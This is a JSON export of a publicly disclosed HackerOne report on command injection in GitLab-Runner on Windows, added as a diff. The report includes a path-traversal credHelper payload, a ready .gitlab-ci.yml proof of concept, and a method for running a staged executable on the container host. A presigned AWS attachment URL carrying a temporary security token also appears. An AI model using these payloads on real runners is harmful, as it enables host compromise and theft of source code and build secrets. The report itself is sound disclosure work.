@@ -1,0 +1,132 @@
+{
+  "id": 955016,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTUwMTY=",
+  "url": "https://hackerone.com/reports/955016",
+  "title": "GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-10T15:08:41.978Z",
+  "submitted_at": "2020-08-10T15:08:42.114Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ajxchapman",
+    "url": "/ajxchapman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ey3f0qnxrppswp9im09fgv2kaecf/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-11-04T08:35:20.727Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-04T08:35:20.631Z",
+  "team_member_agreed_on_going_public_at": "2020-11-03T22:20:39.528Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nGitLab-Runner, when running on Windows with a `docker` executor, is vulnerable to Command Injection via the `DOCKER_AUTH_CONFIG` build variable. Injected commands are executed on the container host, not within a Docker container, as such could compromise all future builds which are executed by the runner.\n\n## Details\n\nWhen using a `docker` executor, the `DOCKER_AUTH_CONFIG` build variable is processed as a JSON docker config file. One of the possible config values, `credHelpers`, specifies a hash of repository keys to docker Credential Helper application values. \n\n```json\n{\n  \"credHelpers\" : {\n    \"repo.example.com\" : \"application\"\n  }\n}\n```\n\nWhen `gitlab-runner` attempts to create an image, each key value pair in the `credHelpers` hash is processed, and the corresponding Credential Helper application is executed by `gitlab-runner` in order to obtain credentials for the repository. This execution occurs on the docker container host, `gitlab-runner` directly `exec`s the Credential Helper to receive it's output.\n\nDocker Credential Helpers, as processed by the `github.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore` function are prepended with the string `docker-credential-` before execution:\n\n```go\n// github.com/docker/cli/cli/config/credentials/native_store.go\nconst (\n\tremoteCredentialsPrefix = \"docker-credential-\"\n\ttokenUsername           = \"<token>\"\n)\n\n...\n\nfunc NewNativeStore(file store, helperSuffix string) Store {\n\tname := remoteCredentialsPrefix + helperSuffix\n\treturn &nativeStore{\n\t\tprogramFunc: client.NewShellProgramFunc(name),\n\t\tfileStore:   NewFileStore(file),\n\t}\n}\n```\n\nThis is sufficient to prevent command injection on *nix based systems, however Windows based systems can exploit path traversal to execute arbitrary programs as Credential Helpers. E.G. a `credHelper` of `{\"helper\" : :/../../../../../../../../Windows/System32/calc.exe\"}` would result in the application `docker-credential-/../../../../../../../../Windows/System32/calc.exe` being executed, which on a Windows system would resolve to `C:/Windows/System32/calc.exe`. This only affects Windows based systems, as Windows does not verify path directories exist during path normalization. In this case, Windows does not check the directory `docker-credential-` exists as it is normalized out due to the path traversal characters following it.\n\nThe Credential Helper execution is ultimately called in the `gitlab-runner` code by `gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go:readConfigsFromCredentialsHelper` calling the `github.com/docker/cli/cli/config/credentials/native_store.go:Get` `docker` API method:\n\n```go\n// gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go\nfunc readConfigsFromCredentialsHelper(config *configfile.ConfigFile) (map[string]types.AuthConfig, error) {\n\thelpersAuths := make(map[string]types.AuthConfig)\n\n\tfor registry, helper := range config.CredentialHelpers {\n\t\tstore := credentials.NewNativeStore(config, helper)\n\n\t\tnewAuths, err := store.Get(registry)\n```\n\nThe issue exists as the `gitlab-runner` code does not check for path traversals in Credential Helper values before passing them to the `docker` API.\n\nIn it's simplest form, this issue can be exploited to execute any program that exists on the system running `gitlab-runner` with uncontrolled arguments. However, arbitrary programs can be executed by setting up a `service` which downloads an executable payload to the `C:\\Builds` volume mounted directory, and setting the full path to the volume mounted directory as the `credHelper` value, e.g.:\n```json\n{\n  \"helper\" : \"/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/testfile.exe\"\n}\n```\n\nThis works as the following three conditions are met:\n1. The source of the volume mounted `build` directory is predictable per build\n1. The `DOCKER_AUTH_CONFIG` is processed once for each created container\n1. The build container is created after all `service` containers have been started.\n\n## Steps to reproduce\n\n* Register and run a runner on a Windows system with a docker executor and a tag of `windows-docker-runner`.\n* Create a Build with the following `.gitlab-ci.yml`:\n\n```yml\nservices:\n  - alpasdfasdfasdfasdfasdfidne:3.5\nvariables:\n  DOCKER_AUTH_CONFIG: \"{\\\"credHelpers\\\" : {\\\"repo.example.com\\\" : \\\"/../../../../../../../../Windows/System32/calc.exe\\\"}}\"\n\nbuild1:\n  tags:\n    - windows-docker-runner\n  stage: build\n  script:\n    - whoami\n```\n\nWhen `gitlab-runner` picks up the build it will process the `DOCKER_AUTH_CONFIG` json and launch the CredentialHelper specified, in this case `calc.exe`.\n\nConfirmed vulnerable version configurations are:\n* gitlab-runner 13.2.2 on Windows 10 with Docker Toolbox (`docker` runner)\n* gitlab-runner 13.2.2 on Windows 2019 with Docker Enterprise (`docker-windows` runner)\n\n## Impact\n\nExploitation of this issue could compromise the underlying system on which `gitlab-runner` runs, exposing source code, build artifacts and other sensitive data to a malicious user.\n\n## What is the current *bug* behavior?\n\ngitlab-runner passes unsanitized JSON values from the `DOCKER_AUTH_CONFIG` build variable to the `github.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore` `docker` API function, which may result in command injection on Windows systems.\n\n## What is the expected *correct* behavior?\n\nJSON supplied via the `DOCKER_AUTH_CONFIG` build variable should be processed to ensure it does not contain malicious content.\n\n## Relevant logs and/or screenshots\n\n{F943021}\n\n## Output of checks\n\n`gitlab-runner --version`\n```\nVersion:      13.2.2\nGit revision: a998cacd\nGit branch:   refs/pipelines/172580057\nGO version:   go1.13.8\nBuilt:        2020-07-30T14:52:23+0000\nOS/Arch:      windows/amd64\n```\n\n`config.toml`\n```toml\nconcurrent = 1\ncheck_interval = 0\n\n[session_server]\n  session_timeout = 1800\n\n[[runners]]\n  name = \"windows\"\n  url = \"https://gitlab.com\"\n  token = \"█████\"\n  executor = \"docker-windows\"\n  [runners.custom_build_dir]\n  [runners.cache]\n    [runners.cache.s3]\n    [runners.cache.gcs]\n  [runners.docker]\n    tls_verify = false\n    image = \"mcr.microsoft.com/windows/servercore:1809\"\n    privileged = false\n    disable_entrypoint_overwrite = false\n    oom_kill_disable = false\n    disable_cache = false\n    volumes = [\"c:\\\\cache\"]\n    shm_size = 0\n```\n\n## Impact\n\nExploitation of this issue could compromise the underlying system on which `gitlab-runner` runs, exposing source code, build artifacts and other sensitive data to a malicious user.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 943021,
+      "file_name": "gitlab-runner-windows.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WwTP9bAu5UPfzCRXdpps5Tm9?response-content-disposition=attachment%3B%20filename%3D%22gitlab-runner-windows.mp4%22%3B%20filename%2A%3DUTF-8%27%27gitlab-runner-windows.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUK2T5BIP%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151703Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIQClz4SXUgbvpm39eq4v%2BP4CfqMsDtnskCUSRYciDTYoHAIgaz0AoIm4dzI0nar2Ex9bCqqsdHzWBvMCPlPStAsOuFYqugUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCrYORIjWQyS1l6cuSqOBeyyNeVj3GuM6lcIl0q%2Bv904BjDCJmWLD7V5F953hTdLwt42RGuWDfK4NXAeUt14GOlW%2FSGFuX3aWdm8Rwf2W3t7gvp3f5HWzdD94azqgHdq7cVcQGLbXInD6CXsqioadl7o9lRqEf4ryGPGWaZHC6u8BEtARmlugb6KbVwa%2BFQzWbNI2lVB9kcYDKUh8Mz%2Fes1caeO%2FQ%2F1qY1Purhqz4CSPCZg8Bg7lBgO6oP3OZHsBZdpJvZKRmkOl1oIEhz6RFvi03MKZGM0tgjRZXn8Vpurg6TGPoXMqJeDkMB6ZWzc28OgO8XBql6bal2A2qTMtDkxWb0UcD%2BZiEOaSDXlq67HBB%2BejgAGtto0ryCAJhv9e02S197w6II%2F80Zdybhjt86HNuGsd56uVHTZPgeg29wvi5pBHDtVyGNbhQUHhH6IQUJygvNES8S3C6Wkmb1SfLTvrNMZ6RGXJShAPC9nBYckL1NkkpFn7AgI60aumRCDKbdGxqOS6TisUAAlPE0xKKEbPSj0L9rOqhna6CFX9cmISrLSBx%2F%2FkRya%2F2EU1PG6NQseeOlpZl2cDH3pikDgbiRe3YN%2Fa2AHsem1RGGIC2WlTcac7WOKMwYwTMNaXykez31lz1LvdnnT0mfSmruVCyWXXcy%2Fjv2h56OpXqlz0hHyVNb2mN4C%2Fogr0QifN%2B7EA2piYer2mt9nV9WLoa4IMU%2BK%2F8HC2AAZUst2tWNLNPKmaNmwJgz0pa59IiZPPG%2Fi6qFTgR5Hwps7pjWltnrclQi%2BMbdyMaFHTJHbdpF%2FS%2FBoFe%2BQrnBGauwJZdWJY%2BLLIWAvGAg4ra%2BWeXhkQDMizGyiNjdXdB1IOexTSP%2B%2B7fVX5kEHdaDigbrfcElGjHjDwgP3PBjqxAWNYDn06%2BMz%2FQmLzsMbXMh7BuRvlzWnlhNL7u50B%2BOzozYNuG6YwKzmDHn2kS7Pjd%2B1HDa1LsXs6452a5irRhv%2FhLJnIfqRtQTYw21Bf%2Bl9JaQw83p78lKb1Rmx6CNRLpjt8AkaR4isQv%2FmROaud7dvhdzbtnnqAl%2Bf4aw21udqYdPfRZv%2BD1ei%2BzKDdgA6b1uHVnRtpclL4vfONoELlnyLm9D4HVOI%2Br8DmmvT5vFzzIw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a29a3c3d3ac6c07928935c6a73963495de336e80bdc576bc11882acdea851f4f",
+      "file_size": 3134616,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 77,
+  "voters": [
+    "tinmo",
+    "m4khn0",
+    "sky003",
+    "n1m0",
+    "ajxchapman",
+    "cdl",
+    "poneglyph",
+    "shreyaschavhan",
+    "bull",
+    "ali",
+    "and 67 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 39022,
+    "asset_type": "OTHER",
+    "asset_identifier": "Your Own GitLab Instance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
